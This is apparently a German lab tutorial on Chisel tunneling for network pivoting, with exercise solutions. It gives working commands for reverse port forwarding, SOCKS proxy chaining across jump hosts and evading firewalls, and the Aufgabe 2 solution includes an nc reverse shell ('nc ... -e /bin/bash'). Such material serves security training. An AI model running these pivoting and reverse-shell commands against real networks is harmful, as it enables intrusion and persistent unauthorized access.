- [Chisel](#chisel)
  - [Verwendung](#verwendung)
    - [Tunneling](#tunneling)
    - [Individual Port Forwarding](#individual-port-forwarding)
    - [Reverse Individual Port Forwarding](#reverse-individual-port-forwarding)
    - [Forward Dynamic SOCKS Proxy](#forward-dynamic-socks-proxy)
    - [Multi Pivoting](#multi-pivoting)
    - [Revshells](#revshells)
  - [Aufgabe 1](#aufgabe-1)
  - [Aufgabe 2](#aufgabe-2)


---

# Chisel

= zum Tunneln von Traffic, wobei Chisel den zu übertragenden TCP Traffic in einen HTTP Tunnel verpackt, welcher wiederum mit SSH gesichert wird.

Vorteile:
- Einfach in der Nutzung
- Sehr perfomant
- Client führt Auto-Reconnect mit größer werdenden zeitlichen Abständen durch
- Mehrere Endpoints über eine Verbindung
- Alternativ Weiterleitung über HTTP-Connect und SOCKS5 Proxy

## Verwendung

### Tunneling

- Man braucht eine Binary für die Client- und Server-Funktionalität
    - mit ca. 10mb relativ groß (Aufklärbarkeit)

Folgende Punkte sollte beachtet werden:
- Auf dem Target
    - Vorteile
        - weniger auffäliig falls eingehende Verbindungen zum Zielsystem erlaubt sind
        - ermöglicht den Zugriff auf interne Netzwerkressourcen
    - Nachteile
        - Zuverlässigkeit der Server Uptime
        - das Zielsystem muss eingehende Verbindungen vom Angreifer zulassen
- Auf dem Attacker (Reverse Tunneling)
    - Vorteile
        - Einrichtung und Verwaltung erleichtert
        - Zugriff auf laufende Dienste
        - Umgehen von Firewalls
    - Nachteile
        - ausgehende Verbindungen können eventuell leichter aufgeklärt werden

### Individual Port Forwarding

```bash
# Voraussetzung: Verbringung der Binary bereits erfolgt
# Aktivieren des Chisel Servers auf dem Target
# Standardmäßig auf Port 8080, kann durch --Port angepasst werden

./chisel server --port 8000 & 

# Verbinden des Clients von Attacker
# Mehrere Port Weiterleitungen hintereinander möglich

./chisel client <server-ip>:<server-port> <local_port>:<target_ip>:<target_port> [<local_port>:....] &

# Hier die Weiterleitung von Attacker Port 4444 auf Target Port 22
# des Rechners im internen Netz

./chisel client 192.168.1.1:8000 4444:10.1.5.251:22 &

# Zugriff auf SSH

ssh user@127.0.0.1 -p 4444
```

### Reverse Individual Port Forwarding

```bash
# Voraussetzung: Verbringung der Binary bereits erfolgt
# Aktivieren des Chisel Servers auf dem Target
# Dieses mal im Reverse Mode

./chisel server --port 8000 --reverse & 

# Verbinden des Clients von Target
# Auch hier lassen sich mehrere Weiterleitungen hintereinander reihen

./chisel client <server-ip>:<server-port> R:<local_port>:<target_ip>:<target_port> [R:<local_port>:....] &

# Auch hier die Weiterleitung von SSH, zusätzlich dazu auch HTTP
# Wichtig: Die Ports werden auf dem Server geöffnet

./chisel client 192.168.1.2:8000 R:4444:10.1.5.251:22 R:5555:10.1.5.251:80 &

# Zugriff auf die Weiterleitung wie im ersten Beispiel

ssh user@127.0.0.1 -p 4444
curl 127.0.0.1:5555
```

### Forward Dynamic SOCKS Proxy

```bash
# Starten des Proxy auf Target

./chisel server --port 8000 --socks5 &

# Verbinden des Clients von Attacker

./chisel client <server-ip>:<server-port> <Proxy_Port>:socks

# Als Beispiel die Einrichtung auf Port 1337

./chisel client 192.168.1.1 1337:socks

# SSH Verbindung auf internen Rechner
# Entsprechende Proxychains Config nutzen

proxychains4 ssh user@10.1.5.251
```

Reverse Dynamic SOCKS Proxy

```bash
# Starten des Proxy auf Attacker

./chisel server --port 8000 --socks5 --reverse &

# Verbinden des Clients von Target
# Wieder das R beachten

./chisel client <server-ip>:<server-port> R:<Proxy_Port>:socks

# Dieses mal auf Port 1338

./chisel client 192.168.1.1 R:1338:socks

# SSH Verbindung auf internen Rechner
# Entsprechende Proxychains Config nutzen

proxychains4 ssh user@10.1.5.251
```

### Multi Pivoting

```bash
# Starten des Proxy auf Attacker

./chisel server --port 8000 --socks5 --reverse &

# Verbinden des Clients von Target1 (Debian) mit Proxy auf Port 1080
# Danach Server auf Target1 starten

./chisel client 192.168.1.1:8000 R:1080:socks &
./chisel server --port 8000 --socks5 --reverse &

# Verbinden des Clients von Target2 (Windows) mit Proxy auf Port 2080
# Aufruf mit Script Block

$scriptBlock = { Start-Process C:\chisel.exe -ArgumentList @('client','10.1.5.252:8000','R:2080:socks') }
Start-Job -ScriptBlock $scriptBlock

# Anpassen der Proxychains Config auf Attacker

socks5 127.0.0.1 1080
socks5 127.0.0.1 2080

# Aufruf auf Webserver hinter Target2

proxychains4 curl 10.10.1.253
```

### Revshells

```bash
# Starten des Servers auf Target

./chisel server --port 8000 --reverse &

# Einrichten von RPF und Listener auf Attacker
# Leitet RevShell auf Port 4444 weiter

./chisel client 192.168.1.1:8000 R:4444:192.168.1.2:4444 &
nc -lvp 4444

# Starten der RevShell auf Target2
# Verbinden auf Jumphost (Target1)

nc 10.1.5.252 4444
```

-----------

## Aufgabe 1

**Never change a running system - ihr solltet das Netz mittlerweile auswendig kennen. Baut ein letztes mal, mit Hilfe der Techniken von Chisel, die Strecke zum Webserver auf und lasst euch die interne Webseite auf eurem Attacker anzeigen.**

```bash
# Attacker

./chisel server --port 8000 --socks5 --reverse

# Jumphost 1

./chisel client 192.168.1.2:8000 R:1080:socks &
./chisel server --port 8000 --socks5 --reverse

# Jumphost 2

./chisel client 10.1.5.252:8000 R:2080:socks &
./chisel server --port 8000 --socks5 --reverse

# Target

./chisel client 10.10.1.254:8000 R:3080:socks &

# Anpassen der /etc/proxychains4.conf

socks5 127.0.0.1 1080
socks5 127.0.0.1 2080
socks5 127.0.0.1 3080

# Öffentliche Website

proxychains curl 10.10.1.253

# Interne Website

proxychains curl localhost
```

## Aufgabe 2

**Leitet auch mit Chisel eine RevShell eurer Wahl auf euren Attacker weiter.**

```bash
# Target

./chisel server --port 7000 --reverse

# Jumphost 2

./chisel client 10.10.1.253:7000 R:4444:10.1.5.252:4444 &
./chisel server --port 7000 --reverse

# Jumphost 1

./chisel client 10.1.5.251:7000 R:4444:192.168.1.1:4444 &
./chisel server --port 7000 --reverse

# Attacker

./chisel client 192.168.1.1:7000 R:4444:192.168.1.2:4444 &
nc -lnvp 4444

# Target

nc localhost 4444 -e /bin/bash
```